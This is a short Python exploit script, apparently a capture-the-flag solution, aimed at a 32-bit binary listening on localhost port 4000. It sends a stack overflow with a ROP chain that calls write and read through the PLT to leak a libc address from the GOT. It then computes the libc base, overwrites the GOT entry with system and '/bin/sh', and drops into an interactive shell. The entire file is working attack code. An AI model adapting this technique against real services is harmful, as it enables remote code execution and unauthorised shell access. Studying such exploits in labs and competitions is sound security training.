import socket
import time
import os
import struct
import telnetlib

def connect(ip, port):
    return socket.create_connection((ip, port))

def p(x):
    return struct.pack('<I', x)

def u(x):
    return struct.unpack('<I', x)[0]

def interact(s):
    print('----- interactive mode -----')
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

read_plt = 0x8048330
write_plt = 0x8048370
write_got = 0x804a01c
__libc_start_main_plt = 0x8048360
__libc_start_main_got = 0x804a018
pop3ret = 0x804854d
__libc_start_main_rel = 0x19990
system_rel = 0x40190
binsh_rel = 0x160a24


s = connect('127.0.0.1', 4000)

payload = b'A' * 51
# write(1, __libc_start_main_got, 4)
payload += p(write_plt)
payload += p(pop3ret)
payload += p(1)
payload += p(__libc_start_main_got)
payload += p(4)

# read(0, __libc_start_main_got, 20)
payload += p(read_plt)
payload += p(pop3ret)
payload += p(0)
payload += p(__libc_start_main_got)
payload += p(20)

# system('/bin/sh')
payload += p(__libc_start_main_plt)
payload += b'BBBB'
payload += p(__libc_start_main_got + 4)

print(s.recv(1024).decode('utf-8'))
s.send(payload)
time.sleep(0.1)

__libc_start_main_addr = u(s.recv(4))
libc_base = __libc_start_main_addr - __libc_start_main_rel
system_addr = libc_base + system_rel
binsh_addr = libc_base + binsh_rel

print('libc_base: {}'.format(hex(libc_base)))

s.send(p(system_addr) + b'/bin/sh\0')
time.sleep(0.1)

interact(s)

